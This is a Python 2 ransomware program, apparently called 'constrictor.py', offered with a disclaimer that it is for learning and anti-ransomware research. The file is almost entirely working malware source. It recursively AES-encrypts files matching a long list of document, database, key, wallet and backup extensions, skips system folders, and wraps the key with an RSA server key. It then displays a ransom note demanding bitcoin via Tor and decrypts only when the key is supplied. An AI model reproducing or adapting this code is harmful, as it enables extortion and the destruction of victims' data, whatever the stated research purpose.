# This is only meant for learning, anti-ransomeware research and fun, please don't use for anything illegal.
# If you do use it for something illegal, i hope you end up in jail and get cancer, because ransomeware is pure evil.

import time,binascii,os,uuid,random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from easygui import *  # yeah id use tkinter but i was lazy


def write_file(data, filename):
    a = open(filename, 'w')
    a.write(data)
    a.close()


def read_file(filename):
    a = open(filename, 'r')
    b = a.read()
    a.close()
    return b


def readbin(filename):
    a = open(filename, 'rb')
    b = a.read()
    a.close()
    return b


def writebin(data, filename):
    a = open(filename, 'wb')
    a.write(data)
    a.close()


def randstr(n):
    abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRTSTUVWXYZ'
    H = ''.join(random.choice(abc) for x in range(n))
    return H


class RSA_key():
    def __init__(self,data):
        key = RSA.importKey(data)
        self.public_key = key
        self.size = key.size

    def encrypt(self,data):
        #  Attention: this function performs the plain, primitive RSA encryption (textbook). In real applications, you always need to use proper cryptographic padding, and you should not directly encrypt data with this method. Failure to do so may lead to security vulnerabilities. It is recommended to use modules Crypto.Cipher.PKCS1_OAEP or Crypto.Cipher.PKCS1_v1_5 instead.
        if self.public_key.can_encrypt:
            encdata = self.public_key.encrypt(data,32)
        else:
            encdata = None
        return encdata


def AESencrypt(data,key):
    enigma=AES.new(key)
    encrypted=enigma.encrypt(data)
    del enigma
    return encrypted


def AESdecrypt(data, key):
    enigma = AES.new(key)
    decrypted = enigma.decrypt(data)
    del enigma
    return decrypted


def decrypt_dir(key,dirfiles):
    dec = []
    for filename in dirfiles:
        try:
            a = readbin(filename)
            b = AESdecrypt(a,key)
            writebin(b,filename)
            print filename,'decrypted'
            dec.append('Decrypted: '+filename)
        except:
            print 'Error decrypting',filename
            dec.append('Error decrypting: '+filename)
    return dec


def dir_files(cwd):
    global ext
    dirfiles=[]
    for root, dirs, files in os.walk(cwd):
        for name in files:
            for x in ext:
                if name.find(x)>=0:
                    dirfiles.append(os.path.join(root,name))
    return dirfiles


def encrypt_dir(key,cwd):
    global ext
    global myfiles
    global folder_exclude
    encfiles = []
    for root, dirs, files in os.walk(cwd):
        for name in files:
            filename = os.path.join(root,name)
            valid_target = False
            ourguy = False
            excluded = False
            for x in ext:
                if name.lower().find(x.lower())>=0:
                    valid_target = True
                    
            for exclusion in folder_exclude:
                if filename.find('\\'+exclusion+'\\')>=0:
                    excluded = True

            for y in myfiles:
                if name.find(y)>=0:
                    ourguy=True
                                
            if valid_target and not excluded and not ourguy:
                encfiles.append(filename)
                a = readbin(filename)
                while len(a) % 16 != 0:
                    a += '\0'
                b = AESencrypt(a, key)
                writebin(b, filename)
                print filename, 'encrypted'
            
    return encfiles

ext = ['.mid', '.wma', '.flv', '.mkv', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav',
       '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.tar.bz2', '.tbk', '.bak', '.tar', '.tgz',
       '.rar', '.zip', '.djv', '.djvu', '.svg', '.bmp', '.png', '.gif', '.raw', '.cgm', '.jpeg', '.jpg', '.tif',
       '.tiff', '.NEF', '.psd', '.cmd', '.class', '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs',
       '.asm', '.pas', '.cpp', '.php', '.ldf', '.mdf', '.ibd', '.MYI', '.MYD', '.frm', '.odb', '.dbf', '.mdb', '.sql',
       '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.sldm', '.sldx', '.ppsm', '.ppsx', '.ppam', '.docb', '.mml',
       '.sxm', '.otg', '.odg', '.uop', '.potx', '.potm', '.pptx', '.pptm', '.std', '.sxd', '.pot', '.pps', '.sti',
       '.sxi', '.otp', '.odp', '.wks', '.xltx', '.xltm', '.xlsx', '.xlsm', '.xlsb', '.slk', '.xlw', '.xlt', '.xlm',
       '.xlc', '.dif', '.stc', '.sxc', '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.docx', '.DOT', '.max',
       '.xml', '.txt', '.CSV', '.uot', '.RTF', '.pdf', '.XLS', '.PPT', '.stw', '.sxw', '.ott', '.odt', '.DOC',
       '.pem', '.csr', '.crt', '.key', '.wallet', '.mp4','.html','.c','.vb','.py','.h','.cad','.sqlite','.wt','.cs',
       '.mp3','.tc','.crypt','.iso','.db']

folder_exclude = ['tmp','winnt','Application Data','AppData','PerfLogs','Program Files', 'Program Files (x86)','ProgramData',
                  'temp','Recovery','$Recycle.bin','System Volume Information','Boot','Windows']

uid = uuid.uuid1()
serverurl = 'http://localhost:5000/'
txt = """\n##################### WARNING! #####################
DO NOT CLOSE THIS WINDOW! DO NOT CLOSE THIS WINDOW!
##################### WARNING! #####################\n
All your files are encrypted and you're shit outta luck.
Your Unique User ID is """+str(uid)+"""
Follow these instructions if you want to recover your files:

1. Go buy 1,000,000 bitcoins
2. Download Tor Browser and go to """+serverurl+"""\n3. On the website in the box where it says to enter your USER DATA, Copy paste the USER DATA from the below or from 'DO NOT DELETE-"""+str(uid)+""".txt'
4. On the next page, save EXACTLY the Bitcoin address
5. Send 1,000,000 Bitcoins to the address
6. Once the bitcoins sent, wait 5 minutes and press the next link.
7. You will see the message saying your payment has been received, and it will give you the key to decrypt your files.
8. If it says your payment has not been received, wait a few minutes, refresh the page, repeat until it gives you the key. I hope you sent the money to the right address.
9. Once you have your key, press "Ok" in this window enter your key for your files to be decrypted."""
Server = RSA_key('-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDUulVxirtogZQdNgx54iCzKyGZ\nV+dnyVJ5unMpqHogo76b/xwqV66X6CNdz8vwB1uOb2NJLZr1p6P9vp9h8R+n2IH0\nrh3083qaDzfDvAvtR0nAiHp32Jx8nwV03nYlqL1vLhIbhX2/1s9n6u2PWmiMPVU1\nv0KjzeHkpEgod4RMlQIDAQAB\n-----END PUBLIC KEY-----')
random.seed(time.time())
aeskey = randstr(16)
print 'DECRYPTION KEY:', aeskey  # this is so you dont fuck yourself over, just enter it below
enckey = binascii.b2a_base64(Server.encrypt('VALID|'+aeskey)[0])
valid = AESencrypt('Valid Key 123456', aeskey)
myfiles = ['DO NOT DELETE-'+str(uid)+'.txt',
           'FILES ENCRYPTED - DO NOT DELETE.txt',
           'constrictor.py']
directory = os.getcwd() # god help you if you run this somewhere important and not a test folder

print 'Encrypting directory',os.getcwd(),'Are you sure you want to proceed?'
raw_input('Press Enter to Proceed')  # these 2 lines are so you dont accidentally encrypt your hard drive like a fucking moron

f = encrypt_dir(aeskey, directory)
write_file(aeskey,'cheat.txt')  # in case of screwup, this is the key.
del aeskey
write_file(enckey,'DO NOT DELETE-'+str(uid)+'.txt')
paid = False
# this is where you would put a ctypes command to change the desktop background or something
msgbox('WARNING! All your files have been encrypted and are UNRECOVERABLE if you do not follow the following instructions!', 'FILES ENCRYPTED')
info = 'USER ID:\n'+str(uid)+'\n\nUSER DATA:\n'+enckey+'\n\nENCRYPTED FILES:\n'
write_file(txt + '\n\n' + info, 'FILES ENCRYPTED - DO NOT DELETE.txt')
for i in f:
    info += i + '\n\n'
while not paid:
    textbox(txt, 'FILES ENCRYPTED', info)
    nk = enterbox('Enter the provided key', 'FILES ENCRYPTED')
    if nk!='' and nk!=None:
        verify = (AESdecrypt(valid,nk) == 'Valid Key 123456')
        if verify:
            msgbox('Key authenticated, your files will now be decrypted.\n Please be patient and do not turn off your computer.','RESCUING FILES')
            d = decrypt_dir(nk,f)
            dinfo = ''
            for dfile in d:
                dinfo += dfile+'\n\n'
            textbox('Thanks for your money and be careful what website you visit or what files you run next time; asshole.', 'FILES RESTORED',dinfo)
            paid = True
        else:
            msgbox('ERROR: Key invalid! Make sure you have not made any mistake.', 'FILES ENCRYPTED')
    else:
        verify = False
